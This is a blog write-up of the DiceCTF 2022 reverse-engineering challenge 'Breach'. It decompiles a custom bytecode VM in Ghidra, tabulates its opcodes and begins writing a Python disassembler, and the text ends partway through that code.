<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>DiceCTF 2022 : Breach Writeup | reductor’s blog</title>
<meta name="generator" content="Jekyll v3.9.0">
<meta property="og:title" content="DiceCTF 2022 : Breach Writeup">
<meta property="og:locale" content="en_US">
<meta name="description" content="tl;dr: Breach (re) script: solve.py Containment (pwn) script: exploit.py">
<meta property="og:description" content="tl;dr: Breach (re) script: solve.py Containment (pwn) script: exploit.py">
<link rel="canonical" href="https://reductor.dev/ctf/2022/02/21/breach-writeup.html">
<meta property="og:url" content="https://reductor.dev/ctf/2022/02/21/breach-writeup.html">
<meta property="og:site_name" content="reductor’s blog">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2022-02-21T14:00:00+00:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="DiceCTF 2022 : Breach Writeup">
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-02-21T14:00:00+00:00","datePublished":"2022-02-21T14:00:00+00:00","description":"tl;dr: Breach (re) script: solve.py Containment (pwn) script: exploit.py","headline":"DiceCTF 2022 : Breach Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://reductor.dev/ctf/2022/02/21/breach-writeup.html"},"url":"https://reductor.dev/ctf/2022/02/21/breach-writeup.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css">
<link type="application/atom+xml" rel="alternate" href="https://reductor.dev/feed.xml" title="reductor's blog">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-HTPYZN8N34"></script>
<script>
  window['ga-disable-G-HTPYZN8N34'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
  window.dataLayer = window.dataLayer || [];
  function gtag(){window.dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-HTPYZN8N34');
</script>
</head>
<body>
<header class="site-header" role="banner">

  <div class="wrapper">
<a class="site-title" rel="author" href="/">reductor's blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewbox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav>
</div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">DiceCTF 2022 : Breach Writeup</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-02-21T14:00:00+00:00" itemprop="datePublished">Feb 21, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>tl;dr:</p>
<ul>
  <li>Breach (re) script: <a href="https://github.com/reductor/dice-ctf-2022-breach-writeup/blob/main/solve.py">solve.py</a>
</li>
  <li>Containment (pwn) script: <a href="https://github.com/reductor/dice-ctf-2022-breach-writeup/blob/main/exploit.py">exploit.py</a>
</li>
</ul>

<p>Unfortunately during the CTF I didn’t manage to solve the challenge, however got very far and finished solving it the day after the challenge had closed.</p>

<h2 id="examining-the-package">Examining the package</h2>

<p>Inside the zip file there is an ‘out’ folder which contains all the relevant files</p>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">breach</code> - The executable</li>
  <li>
<code class="language-plaintext highlighter-rouge">breach.bin</code> - The VM byte code (discussed later)</li>
  <li>
<code class="language-plaintext highlighter-rouge">Dockerfile</code> - A Dockerfile to establish an environment to run</li>
  <li>
<code class="language-plaintext highlighter-rouge">build.sh</code> - A script to build the docker image</li>
  <li>
<code class="language-plaintext highlighter-rouge">run.sh</code> - A script to run the built docker image</li>
</ul>

<p>Looking at the docker file we can see the following</p>
<div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">FROM</span><span class="s"> ubuntu:20.04</span>

<span class="k">COPY</span><span class="s"> breach /app/breach</span>
<span class="k">COPY</span><span class="s"> breach.bin /app/breach.bin</span>

<span class="k">RUN </span><span class="nb">echo</span> <span class="s2">"PWN_FLAG"</span> <span class="o">&gt;</span> /app/flag.txt

<span class="k">CMD</span><span class="s"> /app/breach /app/breach.bin</span>
</code></pre></div></div>

<p>From this we can determine that <code class="language-plaintext highlighter-rouge">breach</code> will run with the <code class="language-plaintext highlighter-rouge">breach.bin</code> specified as an argument and additionally there is a <code class="language-plaintext highlighter-rouge">flag.txt</code> which will be stored next to the application.</p>

<h2 id="looking-at-the-breach-binary">Looking at the breach binary</h2>

<p>Let’s open up the <code class="language-plaintext highlighter-rouge">breach</code> binary in <a href="https://ghidra-sre.org/">Ghidra</a> to better analyze what it’s doing when it gets run</p>

<p>The first thing to do is finding the <code class="language-plaintext highlighter-rouge">main</code> function which is often done by looking at the <code class="language-plaintext highlighter-rouge">entry</code> point and finding the call to <code class="language-plaintext highlighter-rouge">__libc_start_main</code> the first argument passed to this function is <code class="language-plaintext highlighter-rouge">main</code></p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">entry</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_3</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined8</span> <span class="n">in_stack_00000000</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">auStack8</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  
  <span class="n">__libc_start_main</span><span class="p">(</span><span class="n">FUN_00101229</span><span class="p">,</span><span class="n">in_stack_00000000</span><span class="p">,</span><span class="o">&amp;</span><span class="n">stack0x00000008</span><span class="p">,</span><span class="n">FUN_00101960</span><span class="p">,</span><span class="n">FUN_001019d0</span><span class="p">,</span>
                    <span class="n">param_3</span><span class="p">,</span><span class="n">auStack8</span><span class="p">);</span>
  <span class="k">do</span> <span class="p">{</span>
                    <span class="cm">/* WARNING: Do nothing block with infinite loop */</span>
  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now that we know <code class="language-plaintext highlighter-rouge">FUN_00101229</code> is <code class="language-plaintext highlighter-rouge">main</code> let’s take a look at it and change the name and signature of the function to have the correct arguments as it’s fairly well known, and start looking at it</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s">"rb"</span><span class="p">);</span>
<span class="n">fseek</span><span class="p">(</span><span class="n">__stream</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
<span class="n">__size</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
<span class="n">fseek</span><span class="p">(</span><span class="n">__stream</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="n">DAT_001140e0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">__size</span><span class="p">);</span>
<span class="n">fread</span><span class="p">(</span><span class="n">DAT_001140e0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">__size</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
</code></pre></div></div>

<p>From this code we can see that the byte code file gets read into <code class="language-plaintext highlighter-rouge">DAT_001140e0</code> so I’ll rename it appropriately to <code class="language-plaintext highlighter-rouge">bytecode</code> (<code class="language-plaintext highlighter-rouge">rom</code> is another alternative to be considered) to better indicate that it contains the bytecode.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lVar3</span> <span class="o">=</span> <span class="n">DAT_00104040</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="n">DAT_00104040</span> <span class="o">=</span> <span class="n">lVar3</span><span class="p">,</span> <span class="n">DAT_00104048</span> <span class="o">==</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">bVar4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)(</span><span class="n">DAT_00104040</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">bytecode</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">;</span>
    <span class="k">switch</span><span class="p">(</span><span class="n">bVar4</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">DAT_00104048</span> <span class="o">=</span> <span class="sc">'\x01'</span><span class="p">;</span>
    <span class="n">lVar3</span> <span class="o">=</span> <span class="n">DAT_00104040</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="nl">default:</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Unknown instruction: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">bVar4</span><span class="p">);</span>
                <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>From this code we can determine that <code class="language-plaintext highlighter-rouge">lVar3</code> and <code class="language-plaintext highlighter-rouge">DAT_00104040</code> both seem to indicate some sort of offset in the byte code to an instruction so let’s rename them to <code class="language-plaintext highlighter-rouge">inst_offset</code> and <code class="language-plaintext highlighter-rouge">inst_offset</code>, they are likely independent variables because one is the value in a register and the other is the value in memory.</p>

<p>Looking at <code class="language-plaintext highlighter-rouge">bVar</code> it looks to be using the lower 4 bytes (nibble) of the byte code as the instruction, so let’s rename it to <code class="language-plaintext highlighter-rouge">instruction</code> and also let’s give a type to <code class="language-plaintext highlighter-rouge">bytecode</code> as a <code class="language-plaintext highlighter-rouge">byte*</code> so the code becomes a little easier to read.</p>

<p>The while loop appears to continue until <code class="language-plaintext highlighter-rouge">DAT_00104048</code> gets set to <code class="language-plaintext highlighter-rouge">1</code> so let’s rename this to <code class="language-plaintext highlighter-rouge">should_halt</code> and make it a <code class="language-plaintext highlighter-rouge">bool</code> variable as it looks like it only stores <code class="language-plaintext highlighter-rouge">0</code> and <code class="language-plaintext highlighter-rouge">1</code>.</p>

<p>The next bit of useful information can be seen in the handling of instruction 10</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">10</span><span class="p">:</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"r%d = 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">),</span>
        <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)</span>
        <span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00114060</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
<span class="n">inst_offet2</span> <span class="o">=</span> <span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
</code></pre></div></div>

<p>From this and a bit of knowledge about VMs we can determine that there is likely registers in this VM implementation which are called (<code class="language-plaintext highlighter-rouge">r0</code> - <code class="language-plaintext highlighter-rouge">r15</code> – 15 is the max because of the nibble) they get stored in the <code class="language-plaintext highlighter-rouge">DAT_00114060</code> variable which is an array of <code class="language-plaintext highlighter-rouge">long</code>’s meaning that these are 64-bit registers so let’s change <code class="language-plaintext highlighter-rouge">DAT_00114060</code> to be an array of <code class="language-plaintext highlighter-rouge">long[16]</code> and give it the name <code class="language-plaintext highlighter-rouge">registers</code>.</p>

<p>Looking through the rest of the instructions the other bit of data that is missing and unnamed is <code class="language-plaintext highlighter-rouge">DAT_00104060</code> so let’s take a look at the usages of it within the VM instruction loop.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
    <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">registers</span><span class="p">[(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)])</span> <span class="o">=</span>
            <span class="n">registers</span><span class="p">[(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)];</span>
    <span class="n">inst_offet2</span> <span class="o">=</span> <span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">break</span><span class="p">;</span>
<span class="k">case</span> <span class="mi">5</span><span class="p">:</span>
    <span class="n">registers</span><span class="p">[(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">)]</span> <span class="o">=</span>
            <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">DAT_00104060</span> <span class="o">+</span> <span class="n">registers</span><span class="p">[(</span><span class="kt">int</span><span class="p">)(</span><span class="n">uint</span><span class="p">)(</span><span class="n">bytecode</span><span class="p">[</span><span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)]);</span>
    <span class="n">inst_offet2</span> <span class="o">=</span> <span class="n">inst_offset</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">break</span><span class="p">;</span>
</code></pre></div></div>

<p>So it looks like there are two instructions which use this data instruction <code class="language-plaintext highlighter-rouge">4</code> which stores into the memory at the address of one register from the value of another register and instruction <code class="language-plaintext highlighter-rouge">5</code> which does the opposite of loading from this memory, while they both appear to be writing <code class="language-plaintext highlighter-rouge">long</code>’s the offset’s appear to be in bytes, this is likely the memory for the VM to work with so let’s rename <code class="language-plaintext highlighter-rouge">DAT_00104060</code> to <code class="language-plaintext highlighter-rouge">mem</code> and turn it into a <code class="language-plaintext highlighter-rouge">byte</code> array as this is completely unbounded in checks we can’t determine the size so I just use the maximum Ghidra suggests before it overwrites the next symbol (the registers) which is <code class="language-plaintext highlighter-rouge">65536</code> (<code class="language-plaintext highlighter-rouge">0x10000</code>).</p>

<p>I won’t bore you with going into every individual instruction now that we have established the core parts of the VM (some VMs also have an inbuilt stack but this one doesn’t <em>appear</em> to), here is a summary of all the instructions and the operands.</p>

<table>
  <thead>
    <tr>
      <th>Opcode</th>
      <th>Instruction</th>
      <th>Notes</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0</td>
      <td><code class="language-plaintext highlighter-rouge">halt</code></td>
      <td>Stop the VM</td>
    </tr>
    <tr>
      <td>1</td>
      <td><code class="language-plaintext highlighter-rouge">mov src, imm</code></td>
      <td>
<code class="language-plaintext highlighter-rouge">imm</code> is an 8-byte immediate value</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code class="language-plaintext highlighter-rouge">mov dst, src</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>3</td>
      <td><code class="language-plaintext highlighter-rouge">aluop dst, src</code></td>
      <td>
<code class="language-plaintext highlighter-rouge">aluop</code> is based on the other nibble in the instruction and can be <code class="language-plaintext highlighter-rouge">+</code>,<code class="language-plaintext highlighter-rouge">-</code>,<code class="language-plaintext highlighter-rouge">*</code>,<code class="language-plaintext highlighter-rouge">%</code>,<code class="language-plaintext highlighter-rouge">&amp;</code>,<code class="language-plaintext highlighter-rouge">|</code>,<code class="language-plaintext highlighter-rouge">^</code> and <code class="language-plaintext highlighter-rouge">&gt;&gt;</code>
</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code class="language-plaintext highlighter-rouge">mov mem[dst], src</code></td>
      <td>This is an 8-byte read</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code class="language-plaintext highlighter-rouge">mov dst, mem[src]</code></td>
      <td>This is an 8-byte read</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code class="language-plaintext highlighter-rouge">mov dst, rom[src]</code></td>
      <td>This is an 8-byte read, I use  <code class="language-plaintext highlighter-rouge">rom</code> here instead of <code class="language-plaintext highlighter-rouge">bytecode</code> as no other opcode changes these</td>
    </tr>
    <tr>
      <td>7</td>
      <td><code class="language-plaintext highlighter-rouge">jmp imm</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>8</td>
      <td><code class="language-plaintext highlighter-rouge">jmp reg</code></td>
      <td> </td>
    </tr>
    <tr>
      <td>9</td>
      <td><code class="language-plaintext highlighter-rouge">jeq reg1, reg2, imm</code></td>
      <td>If <code class="language-plaintext highlighter-rouge">reg1</code> and <code class="language-plaintext highlighter-rouge">reg2</code> are both equal then it will jump to <code class="language-plaintext highlighter-rouge">imm</code>
</td>
    </tr>
    <tr>
      <td>10</td>
      <td><code class="language-plaintext highlighter-rouge">print reg</code></td>
      <td>This will print the register</td>
    </tr>
  </tbody>
</table>

<p>Now that we know all the instructions you might notice something, when we execute the program it appears to print <code class="language-plaintext highlighter-rouge">Flag:</code> and takes input from the user, but none of these instructions appear to do anything related to this.</p>

<h2 id="writing-a-disassembler">Writing a disassembler</h2>

<p>Now that we know the instructions, it’s time to start writing something to disassemble the binary, there are few things which we might want to look out for when writing this disassembler</p>

<ul>
  <li>Not all of the bytes might be instructions</li>
  <li>The instruction size isn’t fixed so we can’t assume we can start at a random place, we need a known start place (we know atleast 0 is an instruction)</li>
  <li>Instructions might have data or intentionally illegal instructions interleaved to make disassembling harder</li>
  <li>The instructions might get modified at runtime using things like the <code class="language-plaintext highlighter-rouge">mov mem[dst], src</code> instruction as <code class="language-plaintext highlighter-rouge">dst</code> is completely unbounded</li>
</ul>

<p>While these are all things to be aware of and watch out for I often find it’s best to start with the simpliest implementation first of just assume everything is an instruction from the beginning of the file to the end and hope we get lucky.</p>

<p>I’m going to make use of python for doing this so the first thing I’ll is establish some types for the instructions, this will make it easier if I want to do matching on them later</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Halt</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Halt'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">])</span>
<span class="n">MovImm</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'MovImm'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'reg'</span><span class="p">,</span><span class="s">'imm'</span><span class="p">])</span>
<span class="n">MovReg</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'MovReg'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>

<span class="n">Mov</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Mov'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Add</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Add'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Sub</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Sub'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Mul</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Mul'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Mod</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Mod'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">And</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'And'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Or</span>  <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Or'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Xor</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Xor'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">Shr</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Shr'</span><span class="p">,[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">alu_ops</span> <span class="o">=</span> <span class="p">(</span><span class="n">Add</span><span class="p">,</span><span class="n">Sub</span><span class="p">,</span><span class="n">Mul</span><span class="p">,</span><span class="n">Mod</span><span class="p">,</span><span class="n">And</span><span class="p">,</span><span class="n">Or</span><span class="p">,</span><span class="n">Xor</span><span class="p">,</span><span class="n">Shr</span><span class="p">)</span>

<span class="n">MemLoad</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'MemLoad'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">MemStore</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'MemStore'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span><span class="s">'src'</span><span class="p">])</span>
<span class="n">RomLoad</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'RomLoad'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'dst'</span><span class="p">,</span> <span class="s">'src'</span><span class="p">])</span>
<span class="n">Jump</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Jump'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'target'</span><span class="p">])</span>
<span class="n">JumpReg</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'JumpReg'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'reg'</span><span class="p">])</span>
<span class="n">JumpEq</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'JumpEq'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'target'</span><span class="p">,</span><span class="s">'lhs'</span><span class="p">,</span><span class="s">'rhs'</span><span class="p">])</span>
<span class="n">PrintReg</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'Print'</span><span class="p">,</span> <span class="p">[</span><span class="s">'addr'</span><span class="p">,</span><span class="s">'reg'</span><span class="p">])</span>
</code></pre></div></div>

<p>Now that we have the instructions we need to parse the opcodes to turn them into these types</p>

<p>NOTE: I’m using the new <code class="language-plaintext highlighter-rouge">match</code> functionality in Python 3.10 fairly heavily in the solution to this CTF Challenge, as I wanted to try it, and now that I have I don’t think I can live without it (hopefully once seeing how helpful it is you feel the same).</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">offset</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
        <span class="n">opcode</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>

        <span class="n">match</span> <span class="n">opcode</span><span class="p">:</span>
            <span class="n">case</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Halt</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">reg</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">imm</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">offset</span><span class="o">+</span><span class="mi">9</span><span class="p">])</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">MovImm</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg</span><span class="p">,</span> <span class="n">imm</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">9</span>
            <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">MovReg</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
            <span class="n">case</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">aluop</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">reg1</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xf</span>
                <span class="n">reg2</span> <span class="o">=</span> <span class="nb">buffer</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
                <span class="n">Op</span> <span class="o">=</span> <span class="n">alu_ops</span><span class="p">[</span><span class="n">aluop</span><span class="p">]</span>
                <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">Op</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">reg1</span><span class="p">,</span> <span class="n">reg2</span><span class="p">))</span>
                <span class="n">offset</span> <span class="o">+=</span> <span class="mi">2</span>
